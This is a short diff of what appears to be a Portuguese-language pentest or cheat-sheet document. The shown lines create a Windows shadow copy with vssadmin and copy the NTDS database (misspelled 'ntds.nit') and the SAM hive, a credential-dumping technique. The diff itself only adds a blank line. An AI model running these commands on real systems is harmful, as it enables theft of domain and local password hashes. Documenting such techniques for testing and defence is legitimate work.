@@ -53,6 +53,7 @@ Montar uma cópia do volume alvo
 ``vssadmin create shadow /for=c:``
 
 Copiar os arquivos da cópia para o disco local
+
 ``copy \\?\VOLUME_COPIA\windows\ntds\ntds.nit C:\ntds.nit``
 
 ``copy \\?\VOLUME_COPIA\windows\system32\config\sam C:\sam``
